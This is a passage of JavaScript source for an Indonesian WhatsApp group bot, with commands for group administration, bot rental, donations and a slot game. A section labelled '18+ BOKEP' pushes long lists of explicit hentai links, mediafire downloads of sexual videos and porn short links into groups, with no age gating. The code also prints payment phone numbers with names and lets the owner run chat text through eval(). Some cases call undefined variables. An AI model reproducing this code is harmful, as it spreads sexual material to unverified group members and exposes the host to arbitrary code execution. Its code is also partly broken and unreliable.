reply(`\`\`\`✓Sukes menonaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'group' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})  
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
but = [
{ buttonId: '!groupbuka', buttonText: { displayText: 'Buka' }, type: 1 },
{ buttonId: '!grouptutup', buttonText: { displayText: 'Tutup' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk buka/tutup group", faketeks, but, mek)
break
case 'groupbuka' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
reply(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
Hanz.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'grouptutup' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
reply(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
Hanz.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
linkgc = await Hanz.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
Hanz.sendMessage(from, yeh, text, { quoted: ftrol })
break										   		             
case 'promote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
Hanz.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
Hanz.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Hanz.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break

case 'kick' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
Hanz.groupRemove(from, mentioned)
}
break
case 'getpic': case 'getpp': case 'getprofile':{
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
reply(mess.wait)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
pp = await Hanz.getProfilePicture(mentioned)
} catch {
pp = `${imagebb}`
}
buffer = await getBuffer(pp)
Hanz.sendMessage(from, buffer, image, {quoted: mek, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail: fakeimage, contextInfo:{mentionedJid:[mentioned]}})
}
break
case 'setname':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
Hanz.groupUpdateSubject(from, `${body.slice(9)}`)
Hanz.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
Hanz.groupUpdateDescription(from, `${body.slice(9)}`)
Hanz.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setpp':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
media = await Hanz.downloadAndSaveMediaMessage(mek, './database/media_user')
await Hanz.updateProfilePicture(from, media)
reply(mess.wait)
reply(`\`\`\`✓Sukses Mengganti Profil Group\`\`\` *${groupMetadata.subject}*`)
break

//=============18+ BOKEP================
//LINK BOKEP DI BAWAH NYA
case 'kodenuklir':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `📸YAH SUKA 2D 📸
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
Note : EASY MODE = Sange, Biasa Aja, Mental Lemah :v
==============================
MEDIUM MODE = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
HARD MODE = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "HANZ々OFC彡",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - EASY MODE
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MEDIUM MODE -
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - HARD MODE -
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/

══{*BONUS COK*}══
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ftrol})
Hanz.relayWAMessage(res)
break
case 'bokep8':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep9':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep10':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep11':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep12':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep13':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep14':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep15':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break             
			
case 'linkbokep':
        sendButtonLocation(from, 
        `[NO VPN]\n➻ *NO VPN1* : bit.ly/2Qn9Qgu\n➻ *NO VPN2* : bit.ly/3gWaBt8\n➻ *XNXX VPN* : bit.ly/3vJZJ7`,
        `Sebelum Comly Siapin sabun/tisu dulu adick²`, 
        {jpegThumbnail:fs.readFileSync(`./media/thumnail.jpg`)}, 

[{ buttonId: `${prefix}hshdbdhhd`, buttonText: { displayText: 'OK' }, type: 1 },
{ buttonId: `${prefix}hdbdjdhdhd`, buttonText: { displayText: 'Tidak😑' }, type: 1 }])
break                                 
//━━━━━━━━━━━━━━━[ FITUR INFO ]━━━━━━━━━━━━━━━━━//
case 'public':
				if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
			publik = true
				replyy('Sukses mengubah mode self ke public')
			break
			case 'self':
			if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
				publik = false
				replyy('Sukses mengubah mode public ke self')
			break
case 'sewa1':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'GROUP MENU👥',
"description": `LIST SEWA BOT*\n _Hay @${sender.split("@")[0]}_ Ini adalah list sewa bot silahkan pilih`,
"buttonText": "KLIK DISINI",
"listType": "SINGLE_SELECT",
"sections": [
{
    "rows": [ 
       {
           "title": "🕐sewa 1 minggu",
           "rowId": `${prefix}via`
           },
	       {
           "title": "🕑sewa 2 minggu",
           "rowId": `${prefix}via`
           },
	       {
           "title": "🕒sewa 3 minggu",
           "rowId": `${prefix}via`
           },
	       {
           "title": "🕓sewa 1 bulan",
           "rowId": `${prefix}via`
           },
	       {
           "title": "🕔sewa 2 bulan",
           "rowId": `${prefix}via`        
          }  
        ]
      }
    ]
  }
 }, {quoted: floc})
 Hanz.relayWAMessage(res)
 break
case 'info':
        sendButtonLocation(from, 
        `┏━➤ 「 INFO \n┃┃✯ Nama Bot : ${botname} \n┃┃✯ Prefix : Multi\n┃┃✯ Platform : Ubuntu Linux\n┃┃✯ Runtime : ${runtime(process.uptime())}\n┃┃✯ Sc Bot : https://bit.ly/3vRAPnY\n┗━━━━━━━`, 
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/thumnail.jpg`)}, 

[{ buttonId: `${prefix}menu`, buttonText: { displayText: 'Ya👌' }, type: 1 },
{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'Donasi' }, type: 1 }])
break        
 case 'sewa':
        sendButtonLocation(from, 
        `*_Hai ${pushname} 👋🏻_* \n\nyakin nih mau sewa bot ? 🤔 Boong auto banned >_<`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/thumnail.jpg`)}, 
[{ buttonId: `${prefix}sewa1`, buttonText: { displayText: 'Ya👌' }, type: 1 },
{ buttonId: `${prefix}gk`, buttonText: { displayText: 'Tidak😑' }, type: 1 }])
break                      
case 'via':
        sendButtonLocation(from, 
        `*_Hai ${pushname} 👋🏻_* \nSilakan pilih Mau via apa`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/thumnail.jpg`)}, 

[{ buttonId: `${prefix}gopay`, buttonText: { displayText: 'GOPAY' }, type: 1 },
{ buttonId: `${prefix}ovo`, buttonText: { displayText: 'OVO' }, type: 1 },
{ buttonId: `${prefix}dana`, buttonText: { displayText: 'DANA' }, type: 1 }])
break                
case 'gk':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'Cari ☺',
"description": `Emm y udah lah mending main game aja`,
"buttonText": "⋮MULAI️",
"listType": "SINGLE_SELECT",
"sections": [
{
    "rows": [ 
       {
           "title": "Yaudh Donasi aja😊",
           "rowId": `${prefix}donasi`
           },
	       {
           "title": "game aja lah🚶",
           "rowId": `${prefix}slot`     
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
case 'gopay':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, "GOPAY : 085157740529 (Mikey)", faketeks, but, mek)
break
case 'dana':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'DONE' }, type: 1 }
]
sendButton(from, "DANA : 08988743499 (Mustakim)", faketeks, but, mek)
break
case "runtime":
case "test":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
run = process.uptime();
teks = `${kyun(run)}`;
reply(teks);
break;
case "speed":
case "ping":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
const timestamp = speed();
const latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr) => {
const child = stdout.toString("utf-8");
const ssd = child.replace(/Memory:/, "Ram:");
const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
reply(pingnya);
});
break;
case 'verify':
const serialUser = createSerial(18)
veri = sender
_registered.push(sender)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const ara = fs.readFileSync('./media/sticker/verify.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
break
case 'donasi':
teks = `❏INFO BOT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
┣PULSA: 083144394823
┣GOPAY: 083144394823
┣DANA: 083144394823
┗━━⊱`
but = [
{ buttonId: `${prefix}menu`, buttonText: { displayText: 'BACK TO MENU' }, type: 1 },
{ buttonId: `${prefix}sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 },
]
sendButton(from, anu, faketeks, but, mek)
break
//━━━━━━━━━━━━━━━[ FITUR MAKER ]━━━━━━━━━━━━━━━━━//

case 'slot':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
const somtoy2 = sotoy1[Math.floor(Math.random() * sotoy1.length)]
const somtoy3 = sotoy2[Math.floor(Math.random() * sotoy2.length)]
const somtoy4 = sotoy3[Math.floor(Math.random() * sotoy3.length)]
zeroyt7.sendMessage(from, `
[ SLOTS ]\n-----------------
${somtoy2}
${somtoy}<=====
${somtoy3}
[ SLOTS ]
Keterangan : Jika anda Mendapatkan 3 Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`, text, { quoted: ftrol })
break


default:
if (budy.includes(`Mastah`)) {
const ara = fs.readFileSync('./media/sticker/mastah.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`mastah`)) {
const ara = fs.readFileSync('./media/sticker/mastah.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`Ajg`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`Assalamualaikum`)) {
const ara = fs.readFileSync('./media/sticker/Assalamualaikum.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }               
if (budy.includes(`assalamualaikum`)) {
const ara = fs.readFileSync('./media/sticker/Assalamualaikum.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }                     
if (budy.includes(`ajg`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`bangsat`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`kntl`)) {
const ara = fs.readFileSync('./media/sticker/toxic.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (budy.includes(`${owner}`,)) {              
                  const ara = fs.readFileSync('./media/sticker/tag.webp');
                  Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
                  }
if (isOwner) {
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return Hanz.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		}
		fin = process.uptime()
        if (!mek.hasNewMessage) return Hanz.setStatus(`Runtime ${runtime(process.uptime())} | prefix ${prefix} | ${asutes}`)
        mek = mek.messages.all()[0]
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
